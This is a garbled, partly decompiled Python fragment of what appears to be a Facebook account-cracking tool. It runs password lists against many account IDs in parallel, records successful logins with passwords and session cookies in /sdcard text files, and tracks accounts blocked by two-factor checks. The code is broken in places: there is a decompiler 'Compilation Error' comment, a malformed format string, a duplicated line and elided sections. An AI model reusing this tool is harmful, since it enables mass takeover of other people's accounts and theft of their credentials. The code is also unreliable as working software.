...
GT-20000 = ('GT-1015', 'GT-1020', 'GT-1030', 'GT-1035', 'GT-1040', 'GT-1045', 'GT-1050', 'GT-1240', 'GT-1440', 'GT-1450', 'GT-18190', 'GT-18262', 'GT-19060I', 'GT-19082', 'GT-19083', 'GT-19105', 'GT-19152', 'GT-19192', 'GT-19300', 'GT-19505', 'GT-2000', 'GT-20000', 'GT-200s', 'GT-3000', 'GT-414XOP', 'GT-6918', 'GT-7010', 'GT-7020', 'GT-7030', 'GT-7040', 'GT-7050', 'GT-7100', 'GT-7105', 'GT-7110', 'GT-7205', 'GT-7210', 'GT-7240R', 'GT-7245', 'GT-7303', 'GT-7310', 'GT-7320', 'GT-7325', 'GT-7326', 'GT-7340', 'GT-7405', 'GT-7550 5GT-8005', 'GT-8010', 'GT-81', 'GT-810', 'GT-8105',
GT-20000 = ('GT-1015', 'GT-1020', 'GT-1030', 'GT-1035', 'GT-1040', 'GT-1045', 'GT-1050', 'GT-1240', 'GT-1440', 'GT-1450', 'GT-18190', 'GT-18262', 'GT-19060I', 'GT-19082', 'GT-19083', 'GT-19105', 'GT-19152', 'GT-19192', 'GT-19300', 'GT-19505', 'GT-2000', 'GT-20000', 'GT-200s', 'GT-3000', 'GT-414XOP', 'GT-6918', 'GT-7010', 'GT-7020', 'GT-7030', 'GT-7040', 'GT-7050', 'GT-7100', 'GT-7105', 'GT-7110', 'GT-7205', 'GT-7210', 'GT-7240R', 'GT-7245', 'GT-7303', 'GT-7310', 'GT-7320', 'GT-7325', 'GT-7326', 'GT-7340', 'GT-7405', 'GT-7550 5GT-8005', 'GT-8010', 'GT-81', 'GT-810', 'GT-8105',
try:
...
def rmenu1():
    ...
    with ThreadPool(max_workers=60) as tonxoys:
        tid = str(len(xode))
        logo()
        print(f' [{G}•{W}] TOTAL ID :[1;92m ' + tid)
...
def graphrm(id, psd, tid):
    global lop
    # ***<module>.graphrm: Failure: Compilation Error
    togg = []
    sys.stdout.write(f'\r\r{BG}[{W}𝟬𝟲 𝙏𝙐𝙀𝙎𝘿𝘼𝙔 𝙅𝘼𝙉{BG}]{G}{E}{BG}[{G}{lop}{W}/{G}{tid}{BG}[{W}OK{W}:{G}%s{W}/{S}{BG}]{E}) % (len(ok), len(lk)))
    sys.stdout.flush()
    for psw in psd:
        ...
        if 'session_key' in lo:
            ...
            print(f'\r\r{G}[EMRAN-OK] {iid} | {psw}{W}')
            os.system('espeak -a 300 \"ok id\"')
            ok.append(id)
            open('/sdcard/ROOTJAHID-OK.txt', 'a').write(iid + ' | ' + psw + ' | ' + id + '  ------------>>>' + coki + '\n')
            if 'y' in cokix:
                print(f'\r\r{R}[{G}𝙐𝙄𝘿🌺{R}]{W} : {G}{coki}{E}')
                print(f"{W}{'----------------------------------------'}{E}")
            break
        else:
            if twfx in str(lo):
                iid = lo['error']['error_data']['uid']
                print(f'\r\r{BL}[EMRAN-2F] {iid} | {psw}{W}')
                os.system('espeak -a 300 \"two,f id\"')
                open('/sdcard/ROOTJAHID-2F.txt', 'a').write(iid + ' | ' + psw + ' | ' + id + '\n')
                twf.append(id)
                break
            else:
                if 'www.facebook.com' in lo['error']['message']:
                    ...
                    if iid in ok:
                        ...
                        if 'y' in cpx:
                            print(f'\r\r{R}[𝟬𝟮/𝙅𝘼𝙉-𝙁𝙍𝙄𝘿𝘼𝙔 {iid} | {psw}{W}')
                            cp.append(id)
